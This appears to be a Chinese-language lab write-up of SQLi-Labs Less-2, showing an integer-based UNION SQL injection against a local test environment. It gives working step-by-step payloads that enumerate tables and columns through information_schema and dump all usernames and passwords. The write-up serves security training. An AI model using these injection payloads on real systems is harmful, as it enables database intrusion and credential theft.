【SQLi-Labs】Less-2 整型联合查询注入 Writeup

操作者：何芊宏 | 操作日期：2026.10.22 | 分类：CTF | 标签：SQLi-Labs, Web, SQL注入, MySQL

1. 题目信息

  • 平台：SQLi-Labs (本地 phpStudy 环境)
  • 分类：Web - SQL注入
  • 题目名称：Less-2 (GET - Error based - Intiger based)
  • 提示：GET请求，基于报错，整型注入

2. 解题思路与前置原理

本关为整型注入（Intiger based）。与字符型注入（如 Less-1）最大的区别在于后台 SQL 语句的构造方式。Less-2 的后台代码推测为 SELECT * FROM users WHERE id = $id LIMIT 0,1，参数 id 没有被单引号包裹。因此，在构造恶意 Payload 时，不需要使用单引号进行闭合，也不需要追加注释符来消除多余的引号。直接利用空格拼接 UNION SELECT 联合查询语句即可。

3. 操作步骤与解析

第一步：探测注入点与字段数

输入 URL：http://localhost/sqli-labs-master/Less-2/?id=1'

回显现象：页面报错：You have an error in your SQL syntax; check the manual... near '' LIMIT 0,1' at line 1。

解释与原理：观察报错信息 near '' LIMIT 0,1'，说明输入的 1' 直接破坏了后台的 SQL 结构，且后台并未使用单引号包裹输入的参数。确认此处为整型注入。

输入 URL：http://localhost/sqli-labs-master/Less-2/?id=1 ORDER BY 3 （页面正常回显）

输入 URL：http://localhost/sqli-labs-master/Less-2/?id=1 ORDER BY 4 （页面报错：Unknown column '4' in 'order clause'）

解释与原理：使用 ORDER BY 测试列数，当指定第 4 列时数据库提示找不到该列，确认后台查询共有 3 个字段。

第二步：探测回显点

输入 URL：http://localhost/sqli-labs-master/Less-2/?id=-1 UNION SELECT 1,2,3

回显现象：页面原本显示账号密码的位置，输出了数字 2 和 3，未显示 1。

解释与原理：这里使用 -1 作为占位符，使前置查询为空。因为整型注入无需闭合单引号，直接用空格连接 UNION SELECT。页面回显 2 和 3，说明后端代码将查询结果的第 2 列和第 3 列输出到了前端页面，这两个位置即为回显点。

第三步：获取基础信息

输入 URL：http://localhost/sqli-labs-master/Less-2/?id=-1 UNION SELECT 1, database(), version()

回显现象：页面回显点分别输出 security 和 5.7.26。

解释与原理：将回显点替换为 MySQL 内置函数，database() 查库名，version() 查版本。确认库名为 security，版本 5.7.26 表明支持 information_schema 系统库。

第四步：获取表名

输入 URL：http://localhost/sqli-labs-master/Less-2/?id=-1 UNION SELECT 1,2, group_concat(table_name) FROM information_schema.tables WHERE table_schema='security'

回显现象：回显点 3 输出 emails, referrers, uagents, users。

解释与原理：利用 MySQL 自带的 information_schema.tables 元数据表查询。通过 WHERE table_schema='security' 限定查询当前库，使用 group_concat() 函数将多行结果合并为一行输出。

第五步：获取列名

输入 URL：http://localhost/sqli-labs-master/Less-2/?id=-1 UNION SELECT 1,2, group_concat(column_name) FROM information_schema.columns WHERE table_name='users'

回显现象：回显点 3 输出 id, username, password。

解释与原理：改为查询 information_schema.columns 表，通过 table_name='users' 锁定目标数据表，获取其列名（字段名）。

第六步：提取最终数据

输入 URL：http://localhost/sqli-labs-master/Less-2/?id=-1 UNION SELECT 1, group_concat(username), group_concat(password) FROM security.users

回显现象：页面同时输出所有的用户名及对应的密码明文。

解释与原理：已知库、表、列名，直接查询目标表 users。将 username 与 password 分别放入第 2 和第 3 回显点，利用 group_concat() 一次性全量提取数据。

4. 踩坑记录与复盘

  • 整型注入的特殊性：输入带有单引号 ' 会导致 SQL 语法报错，因为整型查询不需要字符串引号。因此后续的 Payload 均不能携带单引号闭合和 --+ 注释符，直接以空格拼接。
  • 占位符的必要性：在使用 UNION SELECT 时，必须使用 id=-1 让原查询为空，否则原网页会优先渲染原查询结果（如 Dumb / Dumb），导致后置的联合查询结果无法正常回显。

5. 知识点归纳：联合注入的共性

结合 Less-1（字符型）与 Less-2（整型）的实操，联合查询注入（UNION Injection）的核心逻辑完全一致，区别仅在于“前置处理”（是否闭合单引号），后续的攻击链路完全通用：

  1. 测列数：必须使用 ORDER BY n 测试出准确的字段数，保证 UNION SELECT 前后列数一致。
  2. 找位置：通过 id=-1 UNION SELECT 1,2,3 观察页面回显，确定哪些列的数据会被输出。
  3. 查元数据（脱库逻辑）：
    • 查库名：database()
    • 查表名：SELECT table_name FROM information_schema.tables WHERE table_schema=库名
    • 查列名：SELECT column_name FROM information_schema.columns WHERE table_name=表名
  4. 拿数据：将目标字段（如 username, password）放入正确的回显点，配合 group_concat() 完成数据提取。

6. 工具环境说明

当前阶段（Less-1 及 Less-2）采用纯手工注入。环境基于本地 phpStudy 搭建的 Apache + MySQL 环境，工具仅依赖系统自带的浏览器。后续遇到需要使用 VS Code 编写 Python 脚本，或配置 Burp Suite 进行抓包改包，及使用 SQLmap 自动化扫描时，将在对应 WP 中详细记录工具的下载、配置及代码成分解析。
